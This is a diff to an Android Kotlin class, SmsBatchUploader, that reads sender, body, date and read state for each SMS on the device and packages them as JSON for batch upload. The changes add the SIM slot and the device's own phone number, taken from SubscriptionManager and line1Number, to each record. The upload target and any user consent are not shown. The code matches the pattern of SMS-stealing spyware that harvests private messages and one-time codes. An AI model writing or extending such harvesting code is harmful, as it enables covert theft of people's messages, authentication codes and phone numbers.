@@ -1,7 +1,12 @@
 package com.example.test.utils
 
 import android.content.Context
+import android.os.Build
 import android.provider.Telephony
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
+import android.util.Log
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -321,6 +326,12 @@ object SmsBatchUploader {
                     put("type", sms.type)
                     put("is_read", sms.isRead)
                     put("received_at", currentTime)
+                    if (sms.simPhoneNumber.isNotEmpty()) {
+                        put("sim_phone_number", sms.simPhoneNumber)
+                    }
+                    if (sms.simSlot >= 0) {
+                        put("sim_slot", sms.simSlot)
+                    }
                 })
             }
 
@@ -351,15 +362,31 @@ object SmsBatchUploader {
         val messages = mutableListOf<SmsModel>()
 
         try {
+            val columns = mutableListOf(
+                Telephony.Sms._ID,
+                Telephony.Sms.ADDRESS,
+                Telephony.Sms.BODY,
+                Telephony.Sms.DATE,
+                Telephony.Sms.READ
+            )
+            
+            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    val testCursor = context.contentResolver.query(box, arrayOf("sub_id"), null, null, null)
+                    testCursor?.use {
+                        if (it.columnCount > 0) {
+                            columns.add("sub_id")
+                        }
+                    }
+                    "sub_id"
+                } catch (e: Exception) {
+                    null
+                }
+            } else null
+            
             val cursor = context.contentResolver.query(
                 box,
-                arrayOf(
-                    Telephony.Sms._ID,
-                    Telephony.Sms.ADDRESS,
-                    Telephony.Sms.BODY,
-                    Telephony.Sms.DATE,
-                    Telephony.Sms.READ
-                ),
+                columns.toTypedArray(),
                 null,
                 null,
                 "${Telephony.Sms.DATE} DESC LIMIT $limit"
@@ -371,6 +398,14 @@ object SmsBatchUploader {
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                 val readIndex = it.getColumnIndex(Telephony.Sms.READ)
+                val subIdIndex = if (subIdColumn != null) {
+                    try {
+                        val idx = it.getColumnIndex(subIdColumn)
+                        if (idx >= 0) idx else -1
+                    } catch (e: Exception) {
+                        -1
+                    }
+                } else -1
 
                 while (it.moveToNext()) {
                     try {
@@ -379,6 +414,30 @@ object SmsBatchUploader {
                         val body = it.getString(bodyIndex)
                         val date = it.getLong(dateIndex)
                         val isRead = it.getInt(readIndex) == 1
+                        
+                        var subId: Int? = null
+                        if (subIdIndex >= 0) {
+                            try {
+                                val subIdValue = it.getInt(subIdIndex)
+                                if (subIdValue >= 0) {
+                                    subId = subIdValue
+                                }
+                            } catch (e: Exception) {
+                                try {
+                                    val subIdValue = it.getString(subIdIndex)
+                                    if (!subIdValue.isNullOrBlank()) {
+                                        subId = subIdValue.toIntOrNull()
+                                    }
+                                } catch (e2: Exception) {
+                                }
+                            }
+                        }
+                        
+                        val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
+                            getSimInfoFromSubId(context, subId)
+                        } else {
+                            Pair("", -1)
+                        }
 
                         if (!address.isNullOrBlank() && body != null) {
                             val (from, to) = if (type == "inbox") {
@@ -396,7 +455,9 @@ object SmsBatchUploader {
                                     body = body,
                                     timestamp = date,
                                     type = type,
-                                    isRead = isRead
+                                    isRead = isRead,
+                                    simPhoneNumber = simPhoneNumber,
+                                    simSlot = simSlot
                                 )
                             )
                         }
@@ -423,15 +484,31 @@ object SmsBatchUploader {
         val messages = mutableListOf<SmsModel>()
 
         try {
+            val columns = mutableListOf(
+                Telephony.Sms._ID,
+                Telephony.Sms.ADDRESS,
+                Telephony.Sms.BODY,
+                Telephony.Sms.DATE,
+                Telephony.Sms.READ
+            )
+            
+            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    val testCursor = context.contentResolver.query(box, arrayOf("sub_id"), null, null, null)
+                    testCursor?.use {
+                        if (it.columnCount > 0) {
+                            columns.add("sub_id")
+                        }
+                    }
+                    "sub_id"
+                } catch (e: Exception) {
+                    null
+                }
+            } else null
+            
             val cursor = context.contentResolver.query(
                 box,
-                arrayOf(
-                    Telephony.Sms._ID,
-                    Telephony.Sms.ADDRESS,
-                    Telephony.Sms.BODY,
-                    Telephony.Sms.DATE,
-                    Telephony.Sms.READ
-                ),
+                columns.toTypedArray(),
                 null,
                 null,
                 "${Telephony.Sms.DATE} DESC LIMIT $limit OFFSET $offset"
@@ -443,6 +520,14 @@ object SmsBatchUploader {
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                 val readIndex = it.getColumnIndex(Telephony.Sms.READ)
+                val subIdIndex = if (subIdColumn != null) {
+                    try {
+                        val idx = it.getColumnIndex(subIdColumn)
+                        if (idx >= 0) idx else -1
+                    } catch (e: Exception) {
+                        -1
+                    }
+                } else -1
 
                 var processed = 0
 
@@ -453,6 +538,30 @@ object SmsBatchUploader {
                         val body = it.getString(bodyIndex)
                         val date = it.getLong(dateIndex)
                         val isRead = it.getInt(readIndex) == 1
+                        
+                        var subId: Int? = null
+                        if (subIdIndex >= 0) {
+                            try {
+                                val subIdValue = it.getInt(subIdIndex)
+                                if (subIdValue >= 0) {
+                                    subId = subIdValue
+                                }
+                            } catch (e: Exception) {
+                                try {
+                                    val subIdValue = it.getString(subIdIndex)
+                                    if (!subIdValue.isNullOrBlank()) {
+                                        subId = subIdValue.toIntOrNull()
+                                    }
+                                } catch (e2: Exception) {
+                                }
+                            }
+                        }
+                        
+                        val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
+                            getSimInfoFromSubId(context, subId)
+                        } else {
+                            Pair("", -1)
+                        }
 
                         if (address.isNullOrBlank() || body == null) continue
 
@@ -471,7 +580,9 @@ object SmsBatchUploader {
                                 body = body,
                                 timestamp = date,
                                 type = type,
-                                isRead = isRead
+                                isRead = isRead,
+                                simPhoneNumber = simPhoneNumber,
+                                simSlot = simSlot
                             )
                         )
                         processed++
@@ -565,8 +676,79 @@ object SmsBatchUploader {
         val body: String,
         val timestamp: Long,
         val type: String,
-        val isRead: Boolean
+        val isRead: Boolean,
+        val simPhoneNumber: String = "",
+        val simSlot: Int = -1
     )
+    
+    private fun getSimPhoneNumberFromSubId(context: Context, subId: Int?): String {
+        if (subId == null || subId < 0) return ""
+        
+        try {
+            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            if (subManager == null) return ""
+            
+            val activeSubscriptions = subManager.activeSubscriptionInfoList
+            if (activeSubscriptions.isNullOrEmpty()) return ""
+            
+            val subscriptionInfo = activeSubscriptions.find { it.subscriptionId == subId }
+            if (subscriptionInfo == null) return ""
+            
+            var phoneNumber = subscriptionInfo.number ?: ""
+            
+            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                    if (telephonyManager != null) {
+                        val tm = telephonyManager.createForSubscriptionId(subId)
+                        phoneNumber = tm.line1Number ?: ""
+                    }
+                } catch (e: Exception) {
+                    Log.w("SmsBatchUploader", "Failed to get line1Number for subId $subId: ${e.message}")
+                }
+            }
+            
+            return phoneNumber
+        } catch (e: Exception) {
+            Log.e("SmsBatchUploader", "Error getting SIM phone number: ${e.message}")
+            return ""
+        }
+    }
+    
+    private fun getSimInfoFromSubId(context: Context, subId: Int?): Pair<String, Int> {
+        if (subId == null || subId < 0) return Pair("", -1)
+        
+        try {
+            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            if (subManager == null) return Pair("", -1)
+            
+            val activeSubscriptions = subManager.activeSubscriptionInfoList
+            if (activeSubscriptions.isNullOrEmpty()) return Pair("", -1)
+            
+            val subscriptionInfo = activeSubscriptions.find { it.subscriptionId == subId }
+            if (subscriptionInfo == null) return Pair("", -1)
+            
+            val simSlot = subscriptionInfo.simSlotIndex
+            var phoneNumber = subscriptionInfo.number ?: ""
+            
+            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                    if (telephonyManager != null) {
+                        val tm = telephonyManager.createForSubscriptionId(subId)
+                        phoneNumber = tm.line1Number ?: ""
+                    }
+                } catch (e: Exception) {
+                    Log.w("SmsBatchUploader", "Failed to get line1Number for subId $subId: ${e.message}")
+                }
+            }
+            
+            return Pair(phoneNumber, simSlot)
+        } catch (e: Exception) {
+            Log.e("SmsBatchUploader", "Error getting SIM info: ${e.message}")
+            return Pair("", -1)
+        }
+    }
 
     data class BatchInfo(
         val batchNumber: Int,
